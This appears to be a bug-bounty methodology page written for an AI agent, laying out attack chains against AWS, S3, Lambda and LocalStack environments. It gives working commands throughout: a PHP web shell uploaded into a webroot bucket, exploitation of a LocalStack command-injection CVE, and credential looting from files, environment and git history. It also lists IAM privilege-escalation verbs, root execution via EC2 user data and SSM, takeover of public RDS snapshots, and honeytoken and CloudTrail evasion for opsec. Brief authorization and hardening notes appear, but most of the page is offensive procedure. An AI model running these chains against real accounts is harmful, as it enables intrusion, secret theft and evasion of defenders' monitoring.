---
technology: "AWS-flavored attack surface (S3 / Lambda / LocalStack)"
kind: bug-bounty-methodology
audience: ai-agent
version: 1.1
source: "corpus-grounded (AWS command-context gate, internal coverage ledger) + upstream-verified: LocalStack docs (edge port 4566, awslocal, permissive default auth), GHSA-hpr6-f4vq-mxch / NVD CVE-2021-32090 (LocalStack dashboard OS command injection via functionName, <0.12.10, fixed 0.12.10; Sonar source 'Hack the Stack with LocalStack'), AWS CLI docs (--endpoint-url, credential file chain, AKIA/ASIA key prefixes), MinIO docs (S3-compatible API), 2026-11-12; Supplement 2026-11-13: six2dez/pentest-book (enumeration/cloud/aws.md, no license — rewritten with attribution), accessed 2026-11-13; Supplement 2 2026-11-13: rewritten from dafthack/CloudPentestCheatsheets (cheatsheets/AWS.md), MIT, accessed 2026-11-13"
provenance: "corpus-grounded: 7 contributing writeups (internal coverage ledger, gate documented in header); upstream CVEs verified against primary sources during enrichment; basis of this page summarized from the unit ledger"
---

Companion page: [[aws|AWS-flavored attack surface overview]] — S3/Lambda/LocalStack in one model. Tool notes live in the tools vault; Appendix A names tools in prose.

# AWS bug bounty methodology (S3 / Lambda / LocalStack)

**Scope:** S3-API endpoints (real AWS, MinIO, LocalStack), Lambda function enumeration/code pulls, LocalStack service abuse, and AWS credential loot on hosts. **Out of scope:** cloud-console phishing/IAM-logic bugs (no endpoint to enumerate from outside), EC2 metadata SSRF as a topic (belongs to web-app SSRF units; the metadata IP appears here only as a loot location).

**Authorization:** writing to buckets and invoking Lambda mutates other people's storage and compute — list-only first, upload only into a path you can justify, and treat emulated services as production (they usually sit next to it).

## Decision tree (one screen)

1. Port 4566 open (or `awslocal` present on a host) → LocalStack path (Phase 4).
2. `x-amz-*` headers / XML errors / `Server: MinIO` on any port → S3-API path (Phase 3), creds needed → Phase 5 loot order.
3. Keys found (git, env, `~/.aws/credentials`) → test against both real AWS (carefully) and the discovered endpoint via `--endpoint-url`.
4. Web app on the same host whose images/files load from an `s3.`-style subdomain → webroot-upload chain (Phase 3C).
5. `lambda list-functions` answers → Phase 3D code pulls.

## Phase 1 — Discovery and fingerprinting

```bash
nmap -sV -p- 198.51.100.10          # 4566/tcp http = LocalStack edge; odd high port + MinIO banner = S3 API
curl -sI http://s3.example.com/ | grep -i x-amz      # x-amz-version-id / x-amz-request-id => S3-shaped
ffuf -u http://example.com -H 'Host: s3.FUZZ.example.com' -w <subdomain list>   # s3./cloud. vhosts
# a /health JSON status blob or a redirect to a DynamoDB-style /shell on the vhost = LocalStack family
```

On-host (post-shell) enumeration: `~/.aws/credentials`, `~/.aws/config`, `env | grep AWS_`, `boto3.Session(... endpoint_url=...)` in app source, docker-compose files mentioning `localstack` (image tag = version), `which awslocal`, hostname (`aws`-style names are a strong tell).

## Phase 2 — Aim the CLI

```bash
aws configure                  # emulators: ANY dummy access key + secret pass; real AWS rejects them
aws --endpoint-url=http://s3.example.com s3 ls
aws --endpoint-url=http://127.0.0.1:4566 dynamodb list-tables      # on-box LocalStack
awslocal logs describe-log-groups                                   # awslocal = endpoint preset to 4566
```

Notes: the CLI insists on *some* credential material even against emulators — dummy values are the accepted pattern because LocalStack does not validate signatures by default (upstream-documented posture, not a bug class). Use `--profile` to keep real vs emulator contexts separate. Real-AWS context: keys with `AKIA` prefix are long-lived, `ASIA` are session tokens (check expiry before deep chains).

## Phase 3 — S3-API chains

**A. Enumerate:** `s3 ls` → `s3 ls s3://<bucket>` → `s3 sync s3://<bucket> .` (keys, DB dumps, SSH keys — one corpus chain pulled an encrypted `id_ed25519` straight out of an "internal" bucket; `s3api list-objects` when you need metadata).

**B. Fingerprint webroot-served buckets:** if the site's images/files load from the bucket's paths, the bucket IS the web root — check what executes server-side (a `.php` probe that renders = PHP handler).

**C. Webroot upload → shell:** `echo '<?php system($_REQUEST["cmd"]); ?>' > sh.php` then `aws --endpoint-url=... s3 cp sh.php s3://<bucket>/` and request it on the main site (corpus-proven both against an emulated endpoint and a MinIO-fronted site). This is a DESTRUCTIVE step: get the upload justified first.

**D. Credential reuse:** object loot feeds the rest — SSH keys, app DBs, config files; MinIO creds usually come from the owning application (one corpus app leaked them through a mass-assignment escalation).

## Phase 4 — Lambda and LocalStack

**A. Lambda enumeration with keys:**

```bash
aws --endpoint-url=http://cloud.example.com lambda list-functions
aws --endpoint-url=http://cloud.example.com lambda get-function --function-name <name> | jq .Code.Location
wget -O code.zip <Code.Location> && unzip code.zip    # handler source: read for secrets
```

Corpus-proven: keys from a git commit's old version of a script → list → get-function → the handler's hardcoded secret (a JWT signing key) unlocked the main app. On emulators the same verbs work with dummy creds.

**B. LocalStack service abuse (post-shell or reachable endpoint):** CloudWatch logs hold what automation logged — `awslocal logs describe-log-groups` → `describe-log-streams --log-group-name <g>` → `get-log-events` (corpus: cloudtrail-group streams whose events named RotateSecret/RestoreSecret operations); follow to `awslocal secretsmanager list-secrets` and read values. Emulated DynamoDB: `dynamodb list-tables` → `scan --table-name users` for credential rows.

**C. LocalStack RCE era (CVE-2021-32090):** versions below 0.12.10 pass the dashboard's `/lambda/<functionName>/code` parameter unsanitized into a shell command (`get-function --function-name %s` → `subprocess` with `shell=True`; upstream Sonar write-up). Image tags in compose files date the instance. DESTRUCTIVE: command injection on a shared dev stack.

**D. Container posture:** compose files frequently map the host docker socket into the LocalStack container (needed for the lambda executor); code execution inside it is one `docker` invocation from the host — check `DOCKER_HOST`, `/var/run/docker.sock` mounts, and the `LAMBDA_EXECUTOR` environment before claiming impact.

## Phase 5 — Credential loot order (on-host)

1. `~/.aws/credentials` and `~/.aws/config` (profiles = environments; note endpoints configured there — the file itself redirects the CLI).
2. `env` — `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` / session tokens.
3. Application source: `boto3.Session(aws_access_key_id=..., endpoint_url=...)`.
4. Git history: the masked `<aws_access_key_id>` in current source appears in cleartext in earlier commits (corpus-proven; also check deleted config scripts).
5. Metadata endpoint at 169.254.169.254 where an SSRF already exists (separate unit's primitive; here only as a loot location).

## Phase 6 — Defense and validation notes

- **Finding shape:** endpoint + auth posture evidence (dummy-key acceptance), enumerated object/function lists (names, counts as *your* log, not the report's), the read/upload artifact, and blast radius (which web root, whose secrets).
- **Defender telemetry to note and avoid:** SigV4 failures from unknown IPs against real buckets; LocalStack access from outside the dev subnet; bucket-object creation events on web-serving prefixes.
- **Hardening for the report:** never expose LocalStack unauthenticated (network-restrict it; it is a dev tool with intentionally absent auth); upgrade past 0.12.10; keep the docker socket out of it where possible; bucket policies that separate webroot prefixes from upload paths; rotate any key found in git history — commits are forever.

## Appendix A — Tooling (named in prose)

- **aws CLI (v2)** — everything above; `--endpoint-url` and `--profile` are the two flags that matter.
- **awslocal** — LocalStack's endpoint-preset wrapper, present on hosts that use the emulator.
- **boto3** — the SDK form of the same calls in application source (loot and tooling).
- **nmap / ffuf / curl** — endpoint and vhost discovery; header triage for x-amz markers.
- **jq / unzip / wget** — Code.Location handling and secret extraction from pulled source.
- References (upstream-verified for this page): LocalStack documentation; GHSA/NVD CVE-2021-32090 with Sonar's source-level write-up; AWS CLI credential-provider docs; MinIO S3-API compatibility docs.

## Appendix B — Quick reference

```bash
aws configure                                            # dummy keys for emulators
aws --endpoint-url=http://s3.example.com s3 ls
aws --endpoint-url=http://s3.example.com s3 sync s3://<bucket> .
aws --endpoint-url=http://cloud.example.com lambda list-functions
aws --endpoint-url=http://cloud.example.com lambda get-function --function-name <name>   # -> Code.Location
awslocal logs describe-log-groups                        # LocalStack on-box
awslocal secretsmanager list-secrets
```

## Supplement (2026-11-13) — real-AWS chains once keys work

Rewritten from six2dez/pentest-book (`enumeration/cloud/aws.md`, no license — rewritten with attribution), accessed 2026-11-13. Facts re-verified at write time: key prefixes and privesc actions against AWS's IAM identifiers documentation and the RhinoSecurity-derived IAM privilege-escalation research mirrored on hackingthe.cloud; no CVEs involved. The page's out-of-scope line excluded *outside-in* IAM logic — with a working key the IAM surface is CLI-enumerable and belongs here.

**S1. Classify the key before anything else.** The access-key prefix names the object you stole (AWS-documented "unique ID prefixes"): `AKIA` long-lived access key, `ASIA` temporary STS access key (unique only with its secret + session token — useless without the token), `ABIA` STS bearer token, `ACCA` context-specific credential, `AGPA` group, `AIDA` IAM user, `AIPA` EC2 instance profile, `ANPA`/`ANVA` managed policy / policy version, `APKA` public key, `AROA` role, `ASCA` certificate. An `AIPA…` string in a config file is an instance-profile reference, not a key.

**S2. Identity and account, one call each:**

```bash
aws sts get-caller-identity                       # exactly who the key is; always safe
aws sts get-access-key-info --access-key-id AKIA… # the owning account ID
```

**S3. Map effective permissions.** Enumerate every policy attached to the identity, then resolve each to its default version document; the loop below lands the full Action/Resource grid in one log (inline policies come from `list-user-policies`/`get-user-policy`, group and role variants follow the same shape):

```bash
for arn in $(aws iam list-policies --query 'Policies[].Arn' --output text); do
  aws iam get-policy-version --policy-arn "$arn" --version-id \
    $(aws iam get-policy --policy-arn "$arn" --query 'Policy.DefaultVersionId' --output text)
done | tee policies.log      # grep for '"Action": "*"' and '"Resource": "*"'
```

Automated equivalents, named in prose: enumerate-iam brute-forces API calls to derive working permissions; PMapper builds the privilege graph and finds escalation paths; ScoutSuite and Cloudsplaining audit from collected credentials; aws_consoler converts a keyset into a console URL when console access is the goal.

**S4. The privilege-escalation verb list** (each action, held alone, is a documented path — verify the full current set against the RhinoSecurity/hackingthe.cloud table): `iam:CreateLoginProfile`/`iam:UpdateLoginProfile` (set a console password on a privileged user), `iam:AddUserToGroup` (self-add to an admin group), `iam:CreateAccessKey` (mint keys for a privileged user), `iam:AttachUserPolicy` (bolt AdministratorAccess onto yourself), `iam:UpdateAssumeRolePolicy` (rewrite a role's trust to admit you), `lambda:UpdateFunctionCode` / `lambda:UpdateFunctionConfiguration` (poison function code or add a malicious layer, inherit the role at next invoke), `glue:UpdateDevEndpoint` (swap the SSH key on a dev endpoint whose role you then inherit).

**S5. EC2 pivots with the right verbs.** `ec2:ModifyInstanceAttribute` lets you replace user-data on a *stopped* instance; a multipart MIME with `cloud_final_modules: [[scripts-user, always]]` plus a shell script runs as root at next boot. The quieter chain is role stapling: `iam:CreateInstanceProfile` → `iam:AddRoleToInstanceProfile` → `ec2:AssociateIamInstanceProfile` on an instance you can reach — the target now serves the new role's credentials on its metadata endpoint.

**S6. SSM as RCE-by-API.** Where `ssm:SendCommand` is allowed and the agent is installed (check `ssm describe-instance-information`), `AWS-RunShellScript` executes as root on the instance and `ssm list-command-invocations --details` returns output — no exploit needed. `ssm describe-parameters` / `ssm get-parameters` is the secrets store on the same service; walk it the same way as SecretsManager (`secretsmanager get-secret-value --secret-id <name>`).

**S7. Other people's snapshots.** Public EBS snapshots are searchable by account or keyword (`ec2 describe-snapshots --restorable-by-user-ids all`); turn a hit into a volume in your own account (`ec2 create-volume --snapshot-id …`), attach it, mount, and grep. RDS public snapshots follow the same arc with a twist: restore the snapshot (`rds restore-db-instance-from-db-snapshot`), then `rds modify-db-instance --master-user-password` — you now own the database's master login. ECR rounds it out: `ecr get-login-password | docker login` then pull and inspect the private images.

**S8. S3 bucket takeover.** A dangling subdomain CNAME pointing at a `*.s3.amazonaws.com` name that no longer exists (404 `NoSuchBucket`) can be re-registered by anyone — create the bucket in the matching region and you control what the subdomain serves. Same energy, other direction: a *writeable* bucket that a webapp loads scripts from is stored XSS against every visitor. Recon tooling for the bucket hunt, named in prose: cloud_enum, lazys3, S3Scanner, and the grayhatwarfare public-bucket search index.

## Supplement 2 (2026-11-13) — credentialed enumeration breadth (dafthack rewrite)

Rewritten from dafthack/CloudPentestCheatsheets (`cheatsheets/AWS.md`), MIT, accessed 2026-11-13. Verified at write time: pacu commands against the RhinoSecurityLabs README and wiki (pip/pipx install — the cheat's `sudo bash install.sh` is gone from the current README), Access Analyzer verbs against the AWS CLI reference, cloudfox/prowler invocations against their own docs. Two source items deliberately not carried: the IMDS section (this unit's scope line puts metadata-SSRF mechanics in the web-app units — the metadata IP stays a loot location only) and WeirdAAL (repo dormant for years; pacu covers the same ground and is maintained).

**T1. AWS is regional — enumerate in loops.** Every verb takes `--region` and answers with only that region's view. Keep a `regions.txt` and wrap enumeration in `while read r; do ... --region $r; done < regions.txt`, adding `--profile $p` plus an outer accounts loop for multi-account estates. Validate each profile first: `sts get-caller-identity` inside the same loop.

**T2. Sweep the principals, then the trust.** `iam list-users` / `iam list-roles` name every principal; export the role ARNs and attempt `sts assume-role --role-arn <arn> --role-session-name <name>` on each. Every success is a role whose trust policy admits you, your account, or a wildcard — and assumed-role credentials inherit that role's permissions. Failures are low-noise; successes surface as ordinary AssumeRole events, easy to lose among automation.

**T3. Read the defender's own homework.** IAM Access Analyzer analyzers hold pre-computed exposure findings: `accessanalyzer list-analyzers` → `list-findings --analyzer-arn <arn>` → `get-finding --analyzer-arn <arn> --id <id>` enumerates the account's external and public access (cross-account buckets, public roles, unused access) exactly as fast as the org could audit it.

**T4. EC2 user data, read side.** S5 covers writing user data for boot-time execution; the read side is pure loot: `ec2 describe-instance-attribute --instance-id <id> --attribute userData --query 'UserData.Value'` returns base64 — decode for boot scripts and their embedded keys, looped across regions and accounts. [[azure]] documents the same idea for Azure VM user data.

**T5. Credentialed external-surface inventory.** One regions loop collects what faces the internet: `ec2 describe-instances --query 'Reservations[].Instances[].PublicIpAddress'`, `elbv2 describe-load-balancers --query 'LoadBalancers[*].DNSName'` (plus classic `elb describe-load-balancers`), `rds describe-db-instances --query 'DBInstances[*].[Endpoint.Address,PubliclyAccessible]'`, `eks describe-cluster --name <c> --query 'cluster.resourcesVpcConfig.publicAccessCidrs'` and the cluster endpoint, `directconnect describe-connections` for the dedicated links, `ec2 describe-security-groups` / `describe-subnets` for topology. arkadiyt's aws_public_ips automates the crawl (driven by `AWS_PROFILE`/`AWS_REGION` per iteration); CloudFox's endpoints command merges the same inventory with IAM analysis.

**T6. Route 53 is the DNS source of truth.** `route53 list-hosted-zones` → `list-resource-record-sets --hosted-zone-id <id>` — the complete subdomain map including internal-only zones, and the CNAME targets that feed S8's dangling-record takeover checks.

**T7. API Gateway inventory.** `apigateway get-rest-apis` (REST APIs) and `apigatewayv2 get-apis` (HTTP/WebSocket) — each carries stages and an `execute-api` endpoint that may front internal logic; pull stage details (`get-stages`) before probing invoke URLs.

**T8. EKS lands you a kubeconfig.** `eks list-clusters` → `eks update-kubeconfig --name <cluster> --region <region>` writes cluster credentials into `~/.kube/config` — the same get-credentials pivot documented in [[gcp]]. What it actually grants depends on the cluster's access mapping; enumerate with `kubectl` before claiming impact ([[kubernetes]]).

**T9. ECS task definitions hold plaintext env vars.** `ecs list-task-definitions` → `ecs describe-task-definition --task-definition <arn> --query 'taskDefinition.containerDefinitions[].environment'` — the same secret class as Lambda environment variables, in the orchestration layer nobody audits.

**T10. CloudFormation is a secrets and roles index.** `cloudformation describe-stacks` pays twice: `Stacks[].Parameters` / `Outputs` routinely carry passwords, keys, and internal endpoints; `.RoleARN` names the IAM role each stack executes as — a ready-made target list for pass-role-style abuse.

**T11. KMS walk.** `kms list-keys` / `list-aliases` → `describe-key` for the policy → `kms decrypt --ciphertext-blob fileb://<loot>` unseals what the estate sealed with its own keys (the [[gcp]] KMS-decrypt counterpart). Same secret-store family: SecretsManager and SSM are S6, and CloudWatch log groups (`logs describe-log-groups` → `get-log-events`) hold the same class of automation leftovers on real AWS as on the Phase 4B emulators.

**T12. Check the trail before getting loud.** `cloudtrail describe-trails` shows where logs ship and whether a multi-region trail exists — an opsec input, not a bypass.

**T13. Pacu as the framework.** Rhino Security's pacu wraps this whole supplement: `set_keys` (or `import_keys <profile>` to pull straight from `~/.aws/credentials`), `run iam__detect_honeytokens` FIRST — canary keys flag the account before you burn it — then `run iam__enum_permissions` / `whoami`, and `run iam__privesc_scan` to run the S4 verb list against the actual policy set. Its session database caches results to minimize API calls and their CloudTrail entries. Fleet-wide audits per profile: ScoutSuite (`scout aws`), prowler (`prowler aws --profile <p>`), CloudFox (`cloudfox aws -p <p> all-checks`).
